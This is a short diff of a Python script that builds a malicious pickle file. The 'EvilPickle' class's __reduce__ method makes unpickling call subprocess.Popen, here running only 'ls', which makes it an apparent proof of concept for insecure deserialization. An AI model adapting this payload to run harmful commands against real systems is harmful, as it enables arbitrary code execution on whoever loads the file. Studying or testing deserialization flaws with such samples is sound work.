@@ -3,11 +3,11 @@ import subprocess
 
 class EvilPickle:
     def __reduce__(self):
-        return (subprocess.Popen, (("/bin/sh","-c","ls"),),)
+        return (subprocess.Popen, (('ls',),))
 
 
 e =  EvilPickle()
 
-with open('evil.pickle', 'wb') as f:
-    pickle.dump(e, f)
+with open('evil.pkl', 'wb') as f:
+    pickle.dump(e, f, protocol=0)
     
